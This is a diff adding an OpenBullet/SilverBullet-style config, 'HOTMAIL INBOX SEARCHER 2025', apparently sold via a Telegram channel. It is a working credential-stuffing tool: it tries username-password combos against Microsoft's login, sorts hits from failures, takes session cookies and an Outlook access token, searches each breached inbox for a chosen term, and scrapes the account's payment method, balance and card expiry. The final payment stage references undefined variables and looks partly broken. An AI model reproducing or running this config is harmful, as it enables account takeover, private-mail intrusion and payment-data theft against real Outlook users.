@@ -1,0 +1,315 @@
+[SETTINGS]
+{
+  "Name": "HOTMAIL INBOX SEARCHER 2025",
+  "SuggestedBots": 101,
+  "MaxCPM": 0,
+  "LastModified": "2025-11-26T18:56:32.1038737+01:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "t.me/mrcombo1services",
+  "Version": "1.1.4 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Search",
+      "VariableName": "REQ",
+      "Id": 1307436092
+    }
+  ],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "HOTMAIL INBOX SEARCHER 2025",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+#@MRCOMBO1 REQUEST POST "https://login.live.com/ppsecure/post.srf?cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&id=292841&contextid=8DB8FA14E294FCF8&opid=F33EF5E76E16D37B&bk=1708115986&uaid=ef78e7c435754d3d864725410efb9b93&pid=0" 
+  CONTENT "i13=0&login=<USER>&loginfmt=<USER>&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=<PASS>&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=-DpQB7t0dRQ%21ep7gZTmex1itH3dOayGWP6vzyng8GMGtCZrDFg1jZhDXicL9vWQeQYVveiz0TdI0adNtQhugdU1vGS0b0eRfRYtp8tIO2nun7BqZYM%21Jz%21S7PZ3lZkhKf7WzQzRiqFOt4Scrg%21YxHWzkrP*nchzLcYKZBePO1VNlJICh16dRTKYXr1tqB7e1eKGfiqvht3mdcj1iPUeLrYwb1Czm1R%21jevV4e0cTu2OIc&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i19=14620" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 619" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Cookie: OParams=11O.DndYUKiGelL0NUYW0sNC7CUGUioJaCMhBt6q!0OLTuBLObUnFH*9e0zDrqW0Z7QW3GGHbawFTAMLB4EcyxOLci4UHUekVqgz8i0dblUDT2EmGcV*PcpFisqMwOTC8XS6p87fKxDx8Rs0Lh3yyTb52uMDQh!7iPqWDkcaNMVmY*1hN7OHZ81hCXAWl*ezPa55HAxrTmyaDINUIBhbEqAkC*g1gsZIkH9H4UKTK*OtfNO7pLYCvU3BjSpPe4mbRehVnqZuVe2LB!KbP1a!fGhjoDhgSTLSRGf!rlFU9gYGJmA5zEN*rP26yDG6v9bnaoZS1V0mJNCjnedpXU9zaQ!pJAe8SOgvYd8Fb*072lUPICSp*zyCEgSie69qQrtwUuSb1r0vGaEoZyjY8pXhx69OKnkfk!tpSixl9Of1jEsxfZ7jAt*mm7vHlOG!C0cmyP9OA88wWtwOQRaCH5s1F9yvt7Yu6yNgKX8CP9w2R37yIR0qEPemewnmSO3GSfyu1jQD6gQ6jAmKDmA3!Bhk79GxUbAahoHRo33aTdYKunbKO7Jrlid*PnYh4IZ*XXzRJdfqjrDwQrkP0gmjsHOFh0VKqfI$; MSPOK=$uuid-5313b34d-182d-4b6a-98dc-2b804e9431a8$uuid-488d58ff-aa41-41c6-9781-52ecfb1c1489" 
+  HEADER "Host: login.live.com" 
+  HEADER "Origin: https://login.live.com" 
+  HEADER "Referer: https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=21&ct=1708115985&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fcobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26nlp%3d1%26deeplink%3dowa%252f%26RpsCsrfState%3d701284f1-8ea2-7045-20f9-367ad20ccf20&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c" 
+  HEADER "sec-ch-ua: \"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" 
+
+#@MRCOMBO1 KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<COOKIES(PPLState)>" NotEqualTo "1" 
+    KEY "<COOKIES(__Host-MSAAUTHP)>" NotEqualTo "11" 
+    KEY "<COOKIES(MSPVis)>" EqualTo "$38936" 
+    KEY "<COOKIES(MSPBack)>" Contains "1708115986" 
+    KEY "\"Votre compte ou mot de passe est incorrect." 
+  KEYCHAIN Retry OR 
+    KEY "Too Many Requests" 
+  KEYCHAIN Success OR 
+    KEY "Le compte Microsoft nécessite JavaScript pour la connexion. Ce navigateur Web ne prend pas en charge JavaScript ou les scripts sont bloqués.<br /><br />Pour savoir si votre navigateur prend en charge JavaScript ou pour autoriser les scripts, reportez-vous à son aide en ligne.</noscript><title>Compte Microsoft</title><meta name=\"robots\" content=\"none" 
+
+#@MRCOMBO1 PARSE "<SOURCE>" LR "\"\",\"urlPost\":\"" "\"}" -> VAR "ppsecureURL" 
+
+#@MRCOMBO1 PARSE "<COOKIES(MSPOK)>" LR "" "" -> VAR "MSPOK" 
+
+#@MRCOMBO1 PARSE "<COOKIES(__Host-MSAAUTH)>" LR "" "" -> VAR "__Host-MSAAUTH" 
+
+#@MRCOMBO1 PARSE "<COOKIES(__Host-MSAAUTHP)>" LR "" "" -> VAR "__Host-MSAAUTHP" 
+
+#@MRCOMBO1 PARSE "<COOKIES(OParams)>" LR "" "" -> VAR "OParams" 
+
+#@MRCOMBO1 PARSE "<SOURCE>" LR "\"sFT\":\"" "\",\"sFTName\":\"PPFT" -> VAR "PPFT1" 
+
+#@MRCOMBO1 FUNCTION URLEncode "<PPFT1>" -> VAR "PPFT" 
+
+#@MRCOMBO1 REQUEST POST "<ppsecureURL>" 
+  CONTENT "PPFT=<PPFT>&canary=&LoginOptions=1&type=28&hpgrequestid=&ctx=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: login.live.com" 
+  HEADER "Cookie: __Host-MSAAUTH=<__Host-MSAAUTH>; MSPOK=<MSPOK>; OParams=<OParams>" 
+  HEADER "Content-Length: 280" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Sec-Ch-Ua: \"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"" 
+  HEADER "Sec-Ch-Ua-Mobile: ?0" 
+  HEADER "Sec-Ch-Ua-Platform: \"Windows\"" 
+  HEADER "Sec-Ch-Ua-Platform-Version: \"\"" 
+  HEADER "Accept-Language: fr-FR,fr;q=0.9" 
+  HEADER "Origin: https://login.live.com" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: https://login.live.com/ppsecure/post.srf?username=ultimegen%40outlook.com&cobrandid=90015&id=292841&contextid=BCC31617ACC490B0&opid=75CCA5EABD94DE32&bk=1757509614&uaid=25760cbc453d4257bdc7c3873c5185fb&pid=0" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Priority: u=0, i" 
+  HEADER "Connection: keep-alive" 
+
+#@MRCOMBO1 PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"pprid\" id=\"pprid\" value=\"" "\">" -> VAR "pprid" 
+
+#@MRCOMBO1 PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"t\" id=\"t\" value=\"" "\">" -> VAR "t" 
+
+#@MRCOMBO1 PARSE "<COOKIES(NAP)>" LR "" "" -> VAR "NAP" 
+
+#@MRCOMBO1 PARSE "<COOKIES(ANON)>" LR "" "" -> VAR "ANON" 
+
+#@MRCOMBO1 PARSE "<COOKIES(WLSSC)>" LR "" "" -> VAR "WLSSC" 
+
+#@MRCOMBO1 PARSE "<SOURCE>" LR "&RpsCsrfState=" "&wa=wsignin1.0" -> VAR "RpsCsrfState" 
+
+#@MRCOMBO1 REQUEST POST "https://outlook.live.com/owa/?username=<USER>&RpsCsrfState=<RpsCsrfState>&wa=wsignin1.0" 
+  CONTENT "wbids=0&pprid=<pprid>&wbid=MSFT&NAP=<NAP>&ANON=<ANON>&t=<t>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: outlook.live.com" 
+  HEADER "Cookie: ClientId=AA07B459DD944F858BCA3975AAFAF0CE; exchangecookie=945eba3c95224c92b12087f6ec06409c; RpsCsrfState.dWF1PcxykBQqSVuzu5KRL00hi4TV0fvhrVsx9IEmGoY=<RpsCsrfState>; X-OWA-RedirectHistory=AhR7n8MBIMPh6Wrw3Qg; MUID=ebac8adeb311400eb3ae7d72a8f8486f;  PPLState=1; MSPAuth=Disabled; MSPProf=Disabled; NAP=<NAP>; ANON=<ANON>; WLSSC=<WLSSC>" 
+  HEADER "Content-Length: 1373" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Sec-Ch-Ua: \"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"" 
+  HEADER "Sec-Ch-Ua-Mobile: ?0" 
+  HEADER "Sec-Ch-Ua-Platform: \"Windows\"" 
+  HEADER "Accept-Language: fr-FR,fr;q=0.9" 
+  HEADER "Origin: https://login.live.com" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: https://login.live.com/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Priority: u=0, i" 
+
+#@MRCOMBO1 PARSE "<COOKIES(DefaultAnchorMailbox)>" LR "" "" -> VAR "DefaultAnchorMailbox" 
+
+#@MRCOMBO1 PARSE "<COOKIES(RPSSecAuth)>" LR "" "" -> VAR "RPSSecAuth" 
+
+#@MRCOMBO1 REQUEST GET "https://outlook.live.com/owa/0/?cobrandid=<cobrandid>&nlp=1&deeplink=owa%2f&RpsCsrfState=<RpsCsrfState>" 
+  
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: fr" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cookie: " 
+  HEADER "Host: outlook.live.com" 
+  HEADER "Referer: https://login.live.com/" 
+  HEADER "sec-ch-ua: \"Not A(Brand\";v=\"99\", \"Microsoft Edge\";v=\"121\", \"Chromium\";v=\"121\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-ch-ua-platform-version: \"10.0.0\"" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0" 
+  HEADER "X-Edge-Shopping-Flag: 0" 
+
+#@MRCOMBO1 PARSE "<COOKIES(X-OWA-CANARY)>" LR "" "" -> VAR "X-OWA-CANARY" 
+
+#@MRCOMBO1 REQUEST POST "https://outlook.live.com/owa/0/service.svc?action=GetAccessTokenforResource&UA=0&app=Mail&n=177" 
+  CONTENT "" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: fr" 
+  HEADER "action: GetAccessTokenforResource" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 0" 
+  HEADER "content-type: application/json; charset=utf-8" 
+  HEADER "Cookie: DefaultAnchorMailbox=<DefaultAnchorMailbox>; RPSSecAuth=<RPSSecAuth>" 
+  HEADER "Host: outlook.live.com" 
+  HEADER "Origin: https://outlook.live.com/" 
+  HEADER "prefer: exchange.behavior=\"IncludeThirdPartyOnlineMeetingProviders\"" 
+  HEADER "Referer: https://outlook.live.com/" 
+  HEADER "sec-ch-ua: \"Not A(Brand\";v=\"99\", \"Microsoft Edge\";v=\"121\", \"Chromium\";v=\"121\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0" 
+  HEADER "X-Edge-Shopping-Flag: 0" 
+  HEADER "x-owa-canary: <X-OWA-CANARY>" 
+  HEADER "x-owa-hosted-ux: false" 
+  HEADER "x-owa-urlpostdata: %7B%22__type%22%3A%22TokenRequest%3A%23Exchange%22%2C%22Resource%22%3A%22https%3A%2F%2Foutlook.live.com%22%2C%22PreferIdpToken%22%3Afalse%7D" 
+  HEADER "x-req-source: Mail" 
+
+#@MRCOMBO1 PARSE "<SOURCE>" JSON "AccessToken" -> VAR "AccessToken" 
+
+#@MRCOMBO1 REQUEST POST "https://outlook.live.com/search/api/v2/query?n=62&cv=xNd%2BeJwA33QGhireunQYc7.64" 
+  CONTENT "{\"Cvid\":\"15523648-205a-79c8-a4c6-60916c5b7675\",\"Scenario\":{\"Name\":\"owa.react\"},\"TimeZone\":\"GMT Standard Time\",\"TextDecorations\":\"Off\",\"EntityRequests\":[{\"EntityType\":\"Message\",\"ContentSources\":[\"Exchange\"],\"Filter\":{\"Or\":[{\"Term\":{\"DistinguishedFolderName\":\"msgfolderroot\"}},{\"Term\":{\"DistinguishedFolderName\":\"DeletedItems\"}}]},\"From\":0,\"Query\":{\"QueryString\":\"<REQ>\"},\"RefiningQueries\":null,\"Size\":25,\"Sort\":[{\"Field\":\"Score\",\"SortDirection\":\"Desc\",\"Count\":3},{\"Field\":\"Time\",\"SortDirection\":\"Desc\"}],\"EnableTopResults\":true,\"TopResultsCount\":3}],\"AnswerEntityRequests\":[{\"Query\":{\"QueryString\":\"<REQ>\"},\"EntityTypes\":[\"Event\",\"File\"],\"From\":0,\"Size\":10,\"EnableAsyncResolution\":true}],\"WholePageRankingOptions\":{\"EntityResultTypeRankingOptions\":[{\"ResultType\":\"Answer\",\"MaxEntitySetCount\":6}],\"DedupeBehaviorHint\":1},\"QueryAlterationOptions\":{\"EnableSuggestion\":true,\"EnableAlteration\":true,\"SupportedRecourseDisplayTypes\":[\"Suggestion\",\"NoResultModification\",\"NoResultFolderRefinerModification\",\"NoRequeryModification\",\"Modification\"]},\"LogicalId\":\"451b4641-9da6-9f30-a8ef-1bf6e2f0e483\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: fr,fr-FR;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6" 
+  HEADER "authorization: Bearer <AccessToken>" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 1110" 
+  HEADER "content-type: application/json" 
+  HEADER "Host: outlook.live.com" 
+  HEADER "Origin: https://outlook.live.com" 
+  HEADER "prefer: exchange.behavior=\"IncludeThirdPartyOnlineMeetingProviders\", exchange.behavior=\"IncludeThirdPartyOnlineMeetingProviders\"" 
+  HEADER "Referer: https://outlook.live.com/" 
+  HEADER "scenariotag: 1stPg_cv" 
+  HEADER "sec-ch-ua: \"Not A(Brand\";v=\"99\", \"Microsoft Edge\";v=\"121\", \"Chromium\";v=\"121\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0" 
+  HEADER "x-anchormailbox: PUID:<DefaultAnchorMailbox>" 
+  HEADER "x-client-flights: OWA_BestMatch_V15,CalendarInsightsFlight,EESForEmailConv,EESForEmailConvSsa,EnableTidBits,EnableTidBits2,PopulateTidBits,PopulateTidBits2,CalendarAnswerFlight,CalendarAnswerWithQas,CalendarAnswerConflicts,CalendarInsightsFlight,ConflictsInCalendarInsights,bfbfileansoff,WprPromoteFileAnswer,FetchFileArtifacts" 
+  HEADER "x-client-localtime: 2024-02-18T19:17:02.580+01:00" 
+  HEADER "X-Edge-Shopping-Flag: 0" 
+  HEADER "x-ms-appname: owa-reactmail" 
+  HEADER "x-owa-hosted-ux: false" 
+  HEADER "x-req-source: Mail" 
+  HEADER "x-search-griffin-version: GWSv2" 
+
+#@MRCOMBO1 FUNCTION Constant "<REQ>" -> CAP "Search" 
+
+#@MRCOMBO1 PARSE "<SOURCE>" JSON "Total" CreateEmpty=FALSE -> CAP "Found" 
+
+#@MRCOMBO1 KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<Found>" GreaterThan "0" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Found>" EqualTo "0" 
+
+REQUEST GET "https://account.microsoft.com/home/api/payment-instruments/pi-summary" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Host: account.microsoft.com" 
+  HEADER "Accept-Language: en-GB,en;q=0.5" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "MS-CV: 4zk2P+DIZUGpQ41V.11.51" 
+  HEADER "__RequestVerificationToken: <tk>" 
+  HEADER "Correlation-Context: v=1,ms.b.tel.market=en-US,ms.b.qos.rootOperationName=GLOBAL.HOME.PROFILE.GETPERSONALINFO" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://account.microsoft.com/profile?lang=en-US" 
+  HEADER "Cookie: tref=MeControl; AMC-MS-CV=<AMC-MS-CV>; MC1=<MC1>; MSFPC=<MSFPC>; canary=no; ak_bmsc=<ak_bmsc>; ANON=<N>; NAP=<AP>; market=IT; GroupIds=<GroupIds>; GRNID=<GRNID>; bm_sv=<bm_sv>; AMCSecAuthJWT=<AMCSecAuthJWT>; AMCSecAuth=<AMCSecAuth>; MicrosoftApplicationsTelemetryDeviceId=52cb7111-c454-40c1-8899-1fe7a4a2a384; ai_session=zIu1L5kMw8aeVdiej+TBfl|1732197889675|1732197921739; authBounced=2024-11-21T14:04:49.676Z; ShCLSessionID=1732197895848_0.008398757496617226; fptctx2=<fptctx2>; MUID=63db9f41acfe4ee29708347254defd07; display-culture=en-US; MS0=616e1b809c024d01a0bb6f696069dd0c" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+PARSE "<SOURCE>" JSON "name" CreateEmpty=FALSE -> CAP "PAYMENT METHOD" 
+
+PARSE "<SOURCE>" JSON "balance" CreateEmpty=FALSE -> CAP "MICROSOFT BALANCE" 
+
+PARSE "<SOURCE>" JSON "expirationDate" CreateEmpty=FALSE -> CAP "CARD RENEW DATE" 
+
+KEYCHECK 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "\"paymentInstruments\":[]" 
+    KEY "<BALANCE>" Contains "0" 
+    KEY "<SUB>" EqualTo "[]" 
+    KEY "<DAYS LEFT>" LessThan "0" 
+  KEYCHAIN Success OR 
+    KEY "<DAYS LEFT>" GreaterThan "0" 
+
+#@MRCOMBO1 FUNCTION Constant "t.me/mrcombo1services" -> CAP "FOR MORE CONFIGS : " 
+
